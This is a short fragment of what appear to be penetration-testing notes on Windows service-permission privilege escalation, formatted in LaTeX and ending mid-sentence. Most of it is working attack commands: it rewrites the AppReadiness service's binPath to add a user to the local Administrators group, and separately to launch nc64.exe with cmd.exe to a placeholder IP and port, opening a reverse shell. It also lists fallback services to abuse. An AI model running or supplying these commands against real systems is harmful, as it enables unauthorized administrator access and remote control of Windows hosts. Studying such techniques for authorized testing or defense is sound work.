\begin{verbatim}
# Check service privilege and rights
sc qc AppReadiness
PsService.exe security AppReadiness


sc config AppReadiness binPath= "cmd /c net localgroup Administrators User /add"
sc start AppReadiness
sc config AppReadiness binPath= "PATH\nc64.exe -e cmd.exe IP PORT"
\end{verbatim}

list of common services in case enumeration does not work:
\begin{itemize}
    \item \verb+AppReadiness+
    \item \verb+vss+
\end{itemize}


If this is performed on a DC then  \ldots
